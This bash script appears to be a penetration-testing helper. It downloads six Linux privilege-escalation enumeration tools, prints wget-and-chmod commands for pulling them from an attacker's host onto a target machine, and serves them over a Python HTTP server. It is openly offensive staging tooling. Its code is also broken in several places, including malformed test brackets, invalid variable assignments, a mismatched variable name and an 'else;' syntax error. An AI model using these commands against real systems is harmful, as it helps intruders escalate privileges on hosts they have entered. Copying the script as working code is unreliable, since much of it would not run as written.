#!/bin/bash

if [ $# != 3]; then
  echo "Usage: #0 <LHOST> <LPORT>"
  return 1
fi

ip = $1
port = $2

if [ ! -f "linpeas.sh" ]; then
  wget "https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh" -O linpeas.sh
fi

if [ ! -f "suid3num.py" ]; then
  wget "https://raw.githubusercontent.com/Anon-Exploiter/SUID3NUM/master/suid3num.py" -O suid3num.py
fi

if [ ! -f "linenum.sh" ]; then
  wget "https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh" -O linenum.sh
fi

if [ ! -f "lse.sh" ]; then
  wget "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh" -O lse.sh
fi

if [ ! -f "linux-exploit-suggester.sh" ]; then
  wget "https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh" -O linux-exploit-suggester.sh
fi

if [ ! -f "linuxprivchecker.py" ]; then
  wget "https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py" -O linuxprivchecker.py
fi

ipold=$(ip addr | grep tun0 | grep inet | tr -s " " | cut -d " " -f 3 | cut -d "/" -f 1)

if [ ! $oldip ]; then
  ipold=$(ip addr | grep eth0 | grep inet | tr -s " " | cut -d " " -f 3 | cut -d "/" -f 1)
fi

echo ""
echo "You can download any of these tools to your target linux machine using commands below:"
echo ""
echo "wget http://$ip:$port/linpeas.sh; chmod +x linpeas.sh"
echo "wget http://$ip:$port/suid3num.py; chmod +x suid3num.py"
echo "wget http://$ip:$port/linenum.sh; chmod +x linenum.sh"
echo "wget http://$ip:$port/lse.sh; chmod +x lse.sh"
echo "wget http://$ip:$port/linux-exploit-suggester.sh; chmod +x linux-exploit-suggester.sh"
echo "wget http://$ip:$port/linuxprivchecker.py; chmod +x linuxprivchecker.py"
echo ""

if [ $port < 1024]; then
  echo "Port is less than 1024, you need to provide your sudo password..."
  sudo python3 -m http.server $port
else;
  python3 -m http.server $port
fi
